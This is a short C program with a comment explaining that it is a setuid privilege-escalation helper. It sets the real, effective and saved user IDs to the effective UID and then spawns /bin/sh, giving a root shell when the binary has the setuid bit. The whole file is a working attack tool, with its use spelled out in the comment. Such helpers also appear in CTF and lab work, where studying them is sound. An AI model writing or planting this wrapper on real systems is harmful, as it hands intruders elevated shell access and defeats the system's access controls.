#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>


/*

This C program escalates the privileges of the current process to 
the effective user ID (EUID) and then launches a shell (/bin/sh). 
Here's a breakdown of what each part does:

Retrieve the effective user ID and group ID:

euid = geteuid(); retrieves the effective user ID (EUID) of the process.
egid = getegid(); retrieves the effective group ID (EGID) of the process.
Set the real, effective, and saved set-user-ID:

setresuid(euid, euid, euid); sets the real, effective, and saved user IDs of the 
calling process to the EUID. This makes the program run as the effective user, 
which could be the superuser (root) or another user with elevated privileges.
Launch a shell:

system("/bin/sh"); runs the shell (/bin/sh) with the privileges of the EUID. 
If the EUID has root privileges, the shell will run with root access.
Summary:

The program effectively gives the user a shell running with elevated 
privileges (potentially root), depending on the EUID of the process. 
This can be used to bypass security measures if the program has been 
granted elevated privileges (e.g., through the setuid bit).
It can be considered a privilege escalation vulnerability 
if misused in the wrong context (e.g., if a non-privileged user 
runs this as part of a setuid program).

*/

int main() {
    uid_t euid;
    gid_t egid;

    egid = getegid();

    euid = geteuid();

    setresuid(euid, euid, euid);

    system("/bin/sh");

    return 0;
}
